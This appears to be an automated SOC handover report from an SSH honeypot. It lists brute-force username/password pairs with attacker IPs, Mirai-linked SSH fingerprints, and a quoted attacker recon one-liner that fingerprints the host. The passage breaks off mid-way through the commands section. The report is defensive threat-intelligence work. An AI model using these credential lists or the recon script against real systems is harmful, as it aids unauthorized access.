# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-30 |
| **Generated At** | 2026-07-30T17:40:29Z |
| **Shift Time** | 17:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **524** |
| Confirmed Threats | **490** |
| False Positives Filtered | **34** (6.5%) |
| Unique Attacker IPs | **133** |
| Countries of Origin | **33** |
| High Severity Cases | **328** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **196** |
| Malware Samples Analyzed | **4** HIGH · **29** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **362** |
| Unique Credential Pairs | **272** |
| Unique Usernames | **122** |
| Unique Passwords | **173** |
| Successful Auth Pairs | **330** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 100 |
| `support` | 19 |
| `admin` | 13 |
| `user` | 12 |
| `supervisor` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 21 |
| `support` | 18 |
| `root` | 13 |
| `1234` | 13 |
| `1` | 13 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 18 |
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `root123` | 6 |
| `root` | `smo@@kkklss` | 6 |
| `root` | `3245gs5662d34` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Apple@2024` | `102.210.149.105` | 2026-07-30T12:56:54 |
| `345gs5662d34` | `345gs5662d34` | `102.210.149.105` | 2026-07-30T12:56:59 |
| `root` | `3245gs5662d34` | `102.210.149.105` | 2026-07-30T12:57:01 |
| `root` | `qwer1234QWER` | `103.84.236.242` | 2026-07-30T12:59:56 |
| `345gs5662d34` | `345gs5662d34` | `103.84.236.242` | 2026-07-30T13:00:01 |
| `root` | `3245gs5662d34` | `103.84.236.242` | 2026-07-30T13:00:03 |
| `support` | `support` | `10.0.0.73` | 2026-07-30T13:07:02 |
| `supervisor` | `p@ssw0rd` | `95.35.29.192` | 2026-07-30T13:09:15 |
| `supervisor` | `p@ssw0rd` | `187.8.120.90` | 2026-07-30T13:09:24 |
| `ssh` | `ssh` | `187.8.120.90` | 2026-07-30T13:11:32 |
| `ssh` | `ssh` | `182.76.36.62` | 2026-07-30T13:11:42 |
| `nobody` | `nobody12` | `24.142.170.231` | 2026-07-30T13:15:02 |
| `Root` | `root` | `221.199.172.66` | 2026-07-30T13:21:56 |
| `Root` | `root` | `123.123.196.140` | 2026-07-30T13:22:06 |
| `root` | `root123` | `10.0.0.73` | 2026-07-30T13:28:29 |
| `root` | `root123` | `85.19.195.12` | 2026-07-30T13:30:11 |
| `root` | `root123` | `27.107.102.154` | 2026-07-30T13:30:23 |
| `sales` | `sales` | `10.0.0.73` | 2026-07-30T13:30:51 |
| `Root` | `root` | `10.0.0.73` | 2026-07-30T13:33:58 |
| `support` | `support` | `176.53.159.196` | 2026-07-30T13:36:00 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-30T13:37:35 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-30T13:37:35 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-30T13:37:36 |
| `root` | `﻿------fuck------` | `14.29.242.244` | 2026-07-30T13:38:12 |
| `root` | `root123` | `196.189.126.185` | 2026-07-30T13:47:19 |
| `root` | `root123` | `178.178.222.53` | 2026-07-30T13:47:26 |
| `sales` | `sales` | `101.13.4.124` | 2026-07-30T13:50:11 |
| `sales` | `sales` | `136.56.34.147` | 2026-07-30T13:50:18 |
| `sales` | `sales` | `120.234.195.41` | 2026-07-30T13:50:27 |
| `Root` | `root` | `109.233.21.109` | 2026-07-30T13:51:47 |
| `root` | `loliloli` | `45.169.200.254` | 2026-07-30T13:59:56 |
| `345gs5662d34` | `345gs5662d34` | `45.169.200.254` | 2026-07-30T13:59:59 |
| `root` | `3245gs5662d34` | `45.169.200.254` | 2026-07-30T14:00:00 |
| `Support` | `Support2007` | `10.0.0.73` | 2026-07-30T14:04:06 |
| `Support` | `Support2007` | `91.144.158.62` | 2026-07-30T14:05:46 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-07-30T14:06:25 |
| `admin` | `adminadmin` | `10.0.0.73` | 2026-07-30T14:09:23 |
| `default` | `toor` | `10.0.0.73` | 2026-07-30T14:11:28 |
| `default` | `toor` | `182.53.52.68` | 2026-07-30T14:16:39 |
| `ubnt` | `1234` | `218.29.196.162` | 2026-07-30T14:25:49 |
| `ubnt` | `1234` | `49.124.151.62` | 2026-07-30T14:25:59 |
| `default` | `1` | `45.178.227.0` | 2026-07-30T14:32:28 |
| `admin` | `admin1234` | `223.107.72.234` | 2026-07-30T14:41:13 |
| `centos` | `centos12345` | `10.0.0.73` | 2026-07-30T14:41:37 |
| `default` | `1` | `10.0.0.73` | 2026-07-30T14:44:42 |
| `user` | `user123456789` | `10.0.0.73` | 2026-07-30T14:44:57 |
| `user` | `user123456789` | `36.137.38.119` | 2026-07-30T14:50:40 |
| `user` | `user123456789` | `122.187.227.145` | 2026-07-30T14:50:50 |
| `admin` | `admin1234` | `220.80.223.144` | 2026-07-30T14:58:27 |
| `user` | `user123456789` | `200.232.114.71` | 2026-07-30T14:58:36 |
| `admin` | `admin1234` | `203.198.129.123` | 2026-07-30T14:58:36 |
| `centos` | `centos12345` | `92.126.223.175` | 2026-07-30T15:00:58 |
| `centos` | `centos12345` | `203.252.10.3` | 2026-07-30T15:01:06 |
| `default` | `1` | `217.150.37.249` | 2026-07-30T15:02:34 |
| `default` | `1` | `112.27.38.203` | 2026-07-30T15:02:49 |
| `supervisor` | `Password` | `220.246.41.171` | 2026-07-30T15:08:05 |
| `root` | `Abcd1234` | `10.0.0.73` | 2026-07-30T15:15:25 |
| `root` | `Abcd1234` | `49.124.149.50` | 2026-07-30T15:17:09 |
| `guest` | `raspberry` | `10.0.0.73` | 2026-07-30T15:17:21 |
| `supervisor` | `Password` | `10.0.0.73` | 2026-07-30T15:20:15 |
| `support` | `Support444` | `58.17.128.7` | 2026-07-30T15:24:15 |
| `root` | `Abcd1234` | `196.188.93.169` | 2026-07-30T15:33:57 |
| `root` | `Abcd1234` | `110.164.201.73` | 2026-07-30T15:34:05 |
| `supervisor` | `Password` | `121.179.93.147` | 2026-07-30T15:38:02 |
| `supervisor` | `admin` | `122.166.253.226` | 2026-07-30T15:43:13 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-30T15:52:04 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-30T15:52:04 |
| `pi` | `pi` | `220.189.253.198` | 2026-07-30T15:52:41 |
| `oracle` | `123456` | `10.0.0.73` | 2026-07-30T15:52:44 |
| `supervisor` | `admin` | `10.0.0.73` | 2026-07-30T15:55:22 |
| `root` | `000000` | `92.118.39.14` | 2026-07-30T15:56:55 |
| `oracle` | `123456` | `103.67.152.201` | 2026-07-30T15:58:12 |
| `root` | `111111` | `92.118.39.14` | 2026-07-30T15:58:50 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-30T15:59:04 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-30T15:59:05 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-30T15:59:06 |
| `root` | `123` | `92.118.39.14` | 2026-07-30T16:00:45 |
| `root` | `123123` | `92.118.39.14` | 2026-07-30T16:02:44 |
| `root` | `1234` | `92.118.39.14` | 2026-07-30T16:04:40 |
| `oracle` | `123456` | `116.53.130.4` | 2026-07-30T16:06:22 |
| `root` | `12345` | `92.118.39.14` | 2026-07-30T16:06:36 |
| `oracle` | `123456` | `179.184.218.49` | 2026-07-30T16:06:36 |
| `pi` | `pi` | `185.40.122.250` | 2026-07-30T16:09:48 |
| `pi` | `pi` | `114.30.180.58` | 2026-07-30T16:09:58 |
| `root` | `12345678` | `92.118.39.14` | 2026-07-30T16:10:22 |
| `23` | `root` | `94.154.43.140` | 2026-07-30T16:10:37 |
| `root` | `11335577` | `43.157.248.241` | 2026-07-30T16:10:48 |
| `345gs5662d34` | `345gs5662d34` | `43.157.248.241` | 2026-07-30T16:10:52 |
| `root` | `3245gs5662d34` | `43.157.248.241` | 2026-07-30T16:10:54 |
| `newusername` | `password` | `42.51.41.137` | 2026-07-30T16:11:20 |
| `root` | `123456789` | `92.118.39.14` | 2026-07-30T16:12:10 |
| `root` | `aA123456` | `95.79.57.221` | 2026-07-30T16:12:12 |
| `root` | `!@12qwas` | `177.53.215.134` | 2026-07-30T16:12:32 |
| `345gs5662d34` | `345gs5662d34` | `177.53.215.134` | 2026-07-30T16:12:34 |
| `root` | `3245gs5662d34` | `177.53.215.134` | 2026-07-30T16:12:35 |
| `supervisor` | `admin` | `210.0.90.82` | 2026-07-30T16:13:16 |
| `root` | `1q2w3e4r` | `92.118.39.14` | 2026-07-30T16:14:02 |
| `soporte` | `soporte2026` | `219.152.229.165` | 2026-07-30T16:14:12 |
| `root` | `654321` | `92.118.39.14` | 2026-07-30T16:15:58 |
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-07-30T16:17:55 |
| `kevin` | `kevin2025` | `156.239.224.104` | 2026-07-30T16:18:47 |
| `345gs5662d34` | `345gs5662d34` | `156.239.224.104` | 2026-07-30T16:18:54 |
| `kevin` | `3245gs5662d34` | `156.239.224.104` | 2026-07-30T16:18:58 |
| `root` | `admin` | `92.118.39.14` | 2026-07-30T16:19:51 |
| `root` | `admin123` | `10.0.0.73` | 2026-07-30T16:28:06 |
| `nobody` | `1234` | `91.92.40.202` | 2026-07-30T16:33:17 |
| `csgo` | `csgo` | `91.92.40.202` | 2026-07-30T16:33:26 |
| `demo` | `demo` | `91.92.40.202` | 2026-07-30T16:33:35 |
| `adminuser` | `adminuser` | `91.92.40.202` | 2026-07-30T16:33:41 |
| `ali` | `ali` | `91.92.40.202` | 2026-07-30T16:33:47 |
| `admin1` | `admin1` | `91.92.40.202` | 2026-07-30T16:33:53 |
| `user` | `git` | `91.92.40.202` | 2026-07-30T16:33:57 |
| `omm` | `omm` | `91.92.40.202` | 2026-07-30T16:34:03 |
| `karel` | `karel` | `91.92.40.202` | 2026-07-30T16:34:09 |
| `admin` | `E4IuG88G` | `91.92.40.202` | 2026-07-30T16:34:15 |
| `grid` | `grid` | `91.92.40.202` | 2026-07-30T16:34:21 |
| `labuser` | `labuser` | `91.92.40.202` | 2026-07-30T16:34:27 |
| `root` | `Welcome@123` | `91.92.40.202` | 2026-07-30T16:34:32 |
| `x` | `1` | `91.92.40.202` | 2026-07-30T16:34:38 |
| `node` | `123456` | `91.92.40.202` | 2026-07-30T16:34:44 |
| `default` | `default` | `91.92.40.202` | 2026-07-30T16:34:49 |
| `master` | `qwerty` | `91.92.40.202` | 2026-07-30T16:34:55 |
| `media` | `media` | `91.92.40.202` | 2026-07-30T16:35:02 |
| `odoo17` | `12345` | `91.92.40.202` | 2026-07-30T16:35:07 |
| `root` | `a123456A` | `91.92.40.202` | 2026-07-30T16:35:13 |
| `ansible` | `qwerty` | `91.92.40.202` | 2026-07-30T16:35:19 |
| `ubuntu` | `ubuntu` | `91.92.40.202` | 2026-07-30T16:35:25 |
| `milad` | `milad123` | `91.92.40.202` | 2026-07-30T16:35:30 |
| `root` | `nimda` | `91.92.40.202` | 2026-07-30T16:35:37 |
| `root` | `QWEqwe123` | `91.92.40.202` | 2026-07-30T16:35:42 |
| `t1` | `123` | `91.92.40.202` | 2026-07-30T16:35:49 |
| `sftpuser` | `123` | `91.92.40.202` | 2026-07-30T16:35:55 |
| `gns3` | `gns3` | `91.92.40.202` | 2026-07-30T16:36:01 |
| `jack` | `1234` | `91.92.40.202` | 2026-07-30T16:36:07 |
| `alex` | `12345678` | `91.92.40.202` | 2026-07-30T16:36:12 |
| `root` | `1qazXSW@` | `91.92.40.202` | 2026-07-30T16:36:19 |
| `dev` | `abc123` | `91.92.40.202` | 2026-07-30T16:36:25 |
| `test` | `test@123` | `91.92.40.202` | 2026-07-30T16:36:31 |
| `openclaw` | `123456` | `91.92.40.202` | 2026-07-30T16:36:36 |
| `bot` | `bot` | `91.92.40.202` | 2026-07-30T16:36:41 |
| `devops` | `1234` | `91.92.40.202` | 2026-07-30T16:36:47 |
| `administrator` | `12345678` | `91.92.40.202` | 2026-07-30T16:36:53 |
| `erpnext` | `erpnext` | `91.92.40.202` | 2026-07-30T16:36:59 |
| `root` | `rootroot` | `91.92.40.202` | 2026-07-30T16:37:04 |
| `root` | `P@ssword` | `91.92.40.202` | 2026-07-30T16:37:11 |
| `test` | `123` | `91.92.40.202` | 2026-07-30T16:37:17 |
| `user` | `111` | `91.92.40.202` | 2026-07-30T16:37:23 |
| `root` | `Aa@123456` | `91.92.40.202` | 2026-07-30T16:37:29 |
| `deploy` | `deploy` | `91.92.40.202` | 2026-07-30T16:37:34 |
| `root` | `pass` | `91.92.40.202` | 2026-07-30T16:37:40 |
| `root` | `Aa111111.` | `91.92.40.202` | 2026-07-30T16:37:46 |
| `root` | `linux` | `91.92.40.202` | 2026-07-30T16:37:52 |
| `claude` | `claude` | `91.92.40.202` | 2026-07-30T16:37:57 |
| `devops` | `123456` | `91.92.40.202` | 2026-07-30T16:38:03 |
| `admin` | `1234` | `91.92.40.202` | 2026-07-30T16:38:09 |
| `sdadmin` | `51nGleD` | `91.92.40.202` | 2026-07-30T16:38:15 |
| `debian` | `Aa123456.` | `91.92.40.202` | 2026-07-30T16:38:20 |
| `ossuser` | `Changeme_123` | `91.92.40.202` | 2026-07-30T16:38:26 |
| `openvpn` | `openvpn` | `91.92.40.202` | 2026-07-30T16:38:32 |
| `linuxuser` | `1` | `91.92.40.202` | 2026-07-30T16:38:38 |
| `root` | `Ac123456` | `91.92.40.202` | 2026-07-30T16:38:44 |
| `ubuntu` | `qwer1234` | `91.92.40.202` | 2026-07-30T16:38:50 |
| `root` | `zaq12wsx` | `91.92.40.202` | 2026-07-30T16:38:56 |
| `root` | `test@123` | `91.92.40.202` | 2026-07-30T16:39:01 |
| `solana` | `1234` | `91.92.40.202` | 2026-07-30T16:39:07 |
| `admin` | `admin1234` | `91.92.40.202` | 2026-07-30T16:39:13 |
| `newuser` | `qwerty` | `91.92.40.202` | 2026-07-30T16:39:19 |
| `mysql` | `mysql@1234` | `91.92.40.202` | 2026-07-30T16:39:25 |
| `admin` | `admin123!` | `91.92.40.202` | 2026-07-30T16:39:32 |
| `system` | `12345` | `91.92.40.202` | 2026-07-30T16:39:38 |
| `guest` | `alpine` | `185.15.189.232` | 2026-07-30T16:39:42 |
| `gitlab` | `root` | `91.92.40.202` | 2026-07-30T16:39:43 |
| `root` | `admin@123` | `91.92.40.202` | 2026-07-30T16:39:49 |
| `root` | `root@1234` | `91.92.40.202` | 2026-07-30T16:39:55 |
| `root` | `asdfasdf-space` | `91.92.40.202` | 2026-07-30T16:40:00 |
| `dev` | `password` | `91.92.40.202` | 2026-07-30T16:40:06 |
| `angel` | `angel` | `91.92.40.202` | 2026-07-30T16:40:12 |
| `ts3` | `ts3` | `91.92.40.202` | 2026-07-30T16:40:18 |
| `ubuntu` | `1234` | `91.92.40.202` | 2026-07-30T16:40:24 |
| `rajvir` | `rajvir123` | `91.92.40.202` | 2026-07-30T16:40:29 |
| `server` | `root` | `91.92.40.202` | 2026-07-30T16:40:34 |
| `root` | `1qaz@wsx` | `91.92.40.202` | 2026-07-30T16:40:40 |
| `deploy` | `123123` | `91.92.40.202` | 2026-07-30T16:40:46 |
| `user` | `1` | `91.92.40.202` | 2026-07-30T16:40:51 |
| `sftpuser` | `sftpuser` | `91.92.40.202` | 2026-07-30T16:40:57 |
| `kingbase` | `123456` | `91.92.40.202` | 2026-07-30T16:41:03 |
| `sam` | `abc123` | `91.92.40.202` | 2026-07-30T16:41:09 |
| `student` | `student123` | `91.92.40.202` | 2026-07-30T16:41:14 |
| `kafka` | `kafka` | `91.92.40.202` | 2026-07-30T16:41:21 |
| `deploy` | `qwerty` | `91.92.40.202` | 2026-07-30T16:41:26 |
| `kim` | `kim123` | `91.92.40.202` | 2026-07-30T16:41:31 |
| `bot` | `abc123` | `91.92.40.202` | 2026-07-30T16:41:38 |
| `tactical` | `123456` | `91.92.40.202` | 2026-07-30T16:41:43 |
| `tester` | `password` | `91.92.40.202` | 2026-07-30T16:41:49 |
| `user3` | `user3` | `91.92.40.202` | 2026-07-30T16:41:54 |
| `user` | `user` | `91.92.40.202` | 2026-07-30T16:42:01 |
| `root` | `root123` | `91.92.40.202` | 2026-07-30T16:42:06 |
| `liyang` | `123456` | `91.92.40.202` | 2026-07-30T16:42:12 |
| `term2` | `term2` | `91.92.40.202` | 2026-07-30T16:42:17 |
| `myuser` | `root` | `91.92.40.202` | 2026-07-30T16:42:23 |
| `root` | `Aaaa1111` | `91.92.40.202` | 2026-07-30T16:42:29 |
| `minecraft` | `minecraft` | `91.92.40.202` | 2026-07-30T16:42:35 |
| `sam` | `1234567890` | `91.92.40.202` | 2026-07-30T16:42:41 |
| `rdpuser` | `123456789` | `91.92.40.202` | 2026-07-30T16:42:47 |
| `root` | `Aa123456.` | `91.92.40.202` | 2026-07-30T16:42:52 |
| `jellyfin` | `123` | `91.92.40.202` | 2026-07-30T16:42:58 |
| `labuser` | `p@ssw0rd` | `91.92.40.202` | 2026-07-30T16:43:04 |
| `root` | `1Q2w3e4r` | `91.92.40.202` | 2026-07-30T16:43:09 |
| `root` | `12345` | `91.92.40.202` | 2026-07-30T16:43:16 |
| `fivem` | `fivem` | `91.92.40.202` | 2026-07-30T16:43:21 |
| `frank` | `frank` | `91.92.40.202` | 2026-07-30T16:43:27 |
| `admin` | `051178` | `91.92.40.202` | 2026-07-30T16:43:34 |
| `root` | `kali` | `91.92.40.202` | 2026-07-30T16:43:40 |
| `deploy` | `123456789` | `91.92.40.202` | 2026-07-30T16:43:47 |
| `root` | `qq123456` | `91.92.40.202` | 2026-07-30T16:43:52 |
| `server` | `12345` | `91.92.40.202` | 2026-07-30T16:43:58 |
| `daniel` | `daniel` | `91.92.40.202` | 2026-07-30T16:44:04 |
| `odoo18` | `123` | `91.92.40.202` | 2026-07-30T16:44:10 |
| `frappe` | `frappe@123` | `91.92.40.202` | 2026-07-30T16:44:16 |
| `vagrant` | `vagrant` | `91.92.40.202` | 2026-07-30T16:44:22 |
| `root` | `123123123` | `91.92.40.202` | 2026-07-30T16:44:28 |
| `osmc` | `osmc` | `91.92.40.202` | 2026-07-30T16:44:33 |
| `root` | `Password` | `91.92.40.202` | 2026-07-30T16:44:39 |
| `root` | `1q2w3e4r` | `91.92.40.202` | 2026-07-30T16:44:45 |
| `customer` | `customer` | `91.92.40.202` | 2026-07-30T16:44:51 |
| `teamspeak` | `teamspeak` | `91.92.40.202` | 2026-07-30T16:44:56 |
| `test` | `123456789` | `91.92.40.202` | 2026-07-30T16:45:01 |
| `user2` | `123456` | `91.92.40.202` | 2026-07-30T16:45:07 |
| `root` | `1q2w3e4r5t6y` | `91.92.40.202` | 2026-07-30T16:45:12 |
| `student` | `student` | `91.92.40.202` | 2026-07-30T16:45:18 |
| `john` | `123456` | `91.92.40.202` | 2026-07-30T16:45:23 |
| `admin123` | `admin123` | `91.92.40.202` | 2026-07-30T16:45:29 |
| `redhat` | `redhat` | `91.92.40.202` | 2026-07-30T16:45:34 |
| `mohammad` | `mohammad` | `91.92.40.202` | 2026-07-30T16:45:40 |
| `admin` | `1qaz@WSX` | `91.92.40.202` | 2026-07-30T16:45:46 |
| `developer` | `dev` | `91.92.40.202` | 2026-07-30T16:45:51 |
| `openvpn` | `12345678` | `91.92.40.202` | 2026-07-30T16:45:57 |
| `ivan` | `ivan` | `91.92.40.202` | 2026-07-30T16:46:03 |
| `rdpuser` | `123` | `91.92.40.202` | 2026-07-30T16:46:08 |
| `vncuser` | `123456` | `91.92.40.202` | 2026-07-30T16:46:14 |
| `claude` | `password` | `91.92.40.202` | 2026-07-30T16:46:20 |
| `sam` | `1qaz@WSX` | `91.92.40.202` | 2026-07-30T16:46:25 |
| `odoo18` | `odoo` | `91.92.40.202` | 2026-07-30T16:46:30 |
| `root` | `P@55w0rd` | `91.92.40.202` | 2026-07-30T16:46:36 |
| `fastuser` | `12345678` | `91.92.40.202` | 2026-07-30T16:46:42 |
| `ubuntu` | `12345678` | `91.92.40.202` | 2026-07-30T16:46:48 |
| `root` | `!qaz@WSX` | `91.92.40.202` | 2026-07-30T16:46:54 |
| `root` | `baidu123` | `91.92.40.202` | 2026-07-30T16:46:59 |
| `tom` | `tom` | `91.92.40.202` | 2026-07-30T16:47:05 |
| `david` | `123456` | `91.92.40.202` | 2026-07-30T16:47:11 |
| `git` | `git` | `91.92.40.202` | 2026-07-30T16:47:22 |
| `user` | `rootroot` | `91.92.40.202` | 2026-07-30T16:47:28 |
| `root` | `admin123` | `24.142.170.231` | 2026-07-30T16:47:30 |
| `systemd` | `1q2w3e4r` | `91.92.40.202` | 2026-07-30T16:47:33 |
| `cloud` | `1` | `91.92.40.202` | 2026-07-30T16:47:39 |
| `user` | `qwe123456` | `91.92.40.202` | 2026-07-30T16:47:44 |
| `minecraft` | `123` | `91.92.40.202` | 2026-07-30T16:47:50 |
| `test` | `passwd` | `91.92.40.202` | 2026-07-30T16:47:55 |
| `ftp` | `ftp` | `91.92.40.202` | 2026-07-30T16:48:01 |
| `root` | `root12345` | `91.92.40.202` | 2026-07-30T16:48:07 |
| `root` | `28011988` | `91.92.40.202` | 2026-07-30T16:48:13 |
| `root` | `r00t` | `91.92.40.202` | 2026-07-30T16:48:18 |
| `test` | `qwerty123` | `91.92.40.202` | 2026-07-30T16:48:24 |
| `root` | `1qaz!QAZ` | `91.92.40.202` | 2026-07-30T16:48:30 |
| `root` | `741852963` | `91.92.40.202` | 2026-07-30T16:48:35 |
| `alex` | `alex` | `91.92.40.202` | 2026-07-30T16:48:41 |
| `deploy` | `user` | `91.92.40.202` | 2026-07-30T16:48:46 |
| `ftp` | `123456` | `91.92.40.202` | 2026-07-30T16:48:52 |
| `root` | `abcd1234` | `91.92.40.202` | 2026-07-30T16:48:58 |
| `root` | `admin` | `91.92.40.202` | 2026-07-30T16:49:04 |
| `system` | `system` | `91.92.40.202` | 2026-07-30T16:49:10 |
| `oracle` | `Aa123456` | `91.92.40.202` | 2026-07-30T16:49:16 |
| `root` | `test1234` | `91.92.40.202` | 2026-07-30T16:49:22 |
| `gitlab` | `git` | `91.92.40.202` | 2026-07-30T16:49:28 |
| `alex` | `1` | `91.92.40.202` | 2026-07-30T16:49:34 |
| `testuser` | `test` | `91.92.40.202` | 2026-07-30T16:49:40 |
| `mysql` | `mysql123` | `91.92.40.202` | 2026-07-30T16:49:45 |
| `root` | `qwerty123` | `91.92.40.202` | 2026-07-30T16:49:51 |
| `ubuntu` | `P@ssw0rd` | `91.92.40.202` | 2026-07-30T16:49:57 |
| `user` | `123` | `91.92.40.202` | 2026-07-30T16:50:03 |
| `runner` | `root` | `91.92.40.202` | 2026-07-30T16:50:09 |
| `adminuser` | `123456` | `91.92.40.202` | 2026-07-30T16:50:15 |
| `hamed` | `hamed` | `91.92.40.202` | 2026-07-30T16:50:20 |
| `claude` | `123` | `91.92.40.202` | 2026-07-30T16:50:26 |
| `rdpuser` | `123456` | `91.92.40.202` | 2026-07-30T16:50:33 |
| `root` | `root@2026` | `91.92.40.202` | 2026-07-30T16:50:39 |
| `steam` | `steam` | `91.92.40.202` | 2026-07-30T16:50:45 |
| `developer` | `12345` | `91.92.40.202` | 2026-07-30T16:50:50 |
| `guest` | `pi` | `91.92.40.202` | 2026-07-30T16:50:57 |
| `root` | `Ab123456` | `91.92.40.202` | 2026-07-30T16:51:03 |
| `main` | `1234` | `91.92.40.202` | 2026-07-30T16:51:09 |
| `ai` | `toor` | `91.92.40.202` | 2026-07-30T16:51:15 |
| `root` | `11` | `91.92.40.202` | 2026-07-30T16:51:21 |
| `root` | `Password1` | `91.92.40.202` | 2026-07-30T16:51:27 |
| `hadoop` | `hadoop123` | `91.92.40.202` | 2026-07-30T16:51:33 |
| `admin` | `0000` | `91.92.40.202` | 2026-07-30T16:51:39 |
| `claude` | `1` | `91.92.40.202` | 2026-07-30T16:51:45 |
| `dev` | `123321` | `91.92.40.202` | 2026-07-30T16:51:51 |
| `root` | `1qazxsw2` | `91.92.40.202` | 2026-07-30T16:51:57 |
| `odoo17` | `odoo` | `91.92.40.202` | 2026-07-30T16:52:02 |
| `root` | `qwe123!@#` | `91.92.40.202` | 2026-07-30T16:52:08 |
| `developer` | `root` | `91.92.40.202` | 2026-07-30T16:52:14 |
| `nutanix` | `nutanix/4u` | `91.92.40.202` | 2026-07-30T16:52:20 |
| `ubuntu` | `Aa123456` | `91.92.40.202` | 2026-07-30T16:52:27 |
| `server` | `1234` | `91.92.40.202` | 2026-07-30T16:52:33 |
| `admin` | `P@ssw0rd` | `91.92.40.202` | 2026-07-30T16:52:39 |
| `hadoop` | `123` | `91.92.40.202` | 2026-07-30T16:52:45 |
| `vncuser` | `password` | `91.92.40.202` | 2026-07-30T16:52:51 |
| `www` | `www` | `91.92.40.202` | 2026-07-30T16:52:57 |
| `elastic` | `123456` | `91.92.40.202` | 2026-07-30T16:53:03 |
| `root` | `ZAQ!2wsx` | `91.92.40.202` | 2026-07-30T16:53:09 |
| `usuario` | `usuario` | `91.92.40.202` | 2026-07-30T16:53:15 |
| `asterisk` | `asterisk` | `91.92.40.202` | 2026-07-30T16:53:20 |
| `minecraft` | `1` | `91.92.40.202` | 2026-07-30T16:53:27 |
| `tomcat` | `tomcat` | `91.92.40.202` | 2026-07-30T16:53:33 |
| `packer` | `packer` | `91.92.40.202` | 2026-07-30T16:53:39 |
| `test1` | `123456789` | `91.92.40.202` | 2026-07-30T16:53:45 |
| `mysql` | `mysql` | `91.92.40.202` | 2026-07-30T16:53:51 |
| `deploy` | `dev` | `91.92.40.202` | 2026-07-30T16:53:57 |
| `deployer` | `12345678` | `91.92.40.202` | 2026-07-30T16:54:03 |
| `testuser` | `123321` | `91.92.40.202` | 2026-07-30T16:54:09 |
| `claude` | `root` | `91.92.40.202` | 2026-07-30T16:54:15 |
| `frappe` | `frappe123` | `91.92.40.202` | 2026-07-30T16:54:20 |
| `webmaster` | `webmaster` | `91.92.40.202` | 2026-07-30T16:54:26 |
| `test` | `123456` | `91.92.40.202` | 2026-07-30T16:54:32 |
| `ts3` | `123` | `91.92.40.202` | 2026-07-30T16:54:39 |
| `teamspeak` | `root` | `91.92.40.202` | 2026-07-30T16:54:44 |
| `aaa` | `chris` | `91.92.40.202` | 2026-07-30T16:54:49 |
| `guest` | `abc123` | `91.92.40.202` | 2026-07-30T16:54:56 |
| `pi` | `1` | `91.92.40.202` | 2026-07-30T16:55:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **524** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 256 |
| OpenSSH | 56 |
| libssh | 31 |
| Paramiko (Python) | 14 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 224 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 49 | 47 |
| `f555226df196...` | Mirai/variant | 21 | 9 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 13 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 224 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 49 | 47 | Mirai/variant |
| `f555226df196...` | libssh | 21 | 9 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 13 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 2 | — |
| `eff4c24daffc...` | Go SSH scanner | 10 | 1 | Modern SSH client |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 12 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
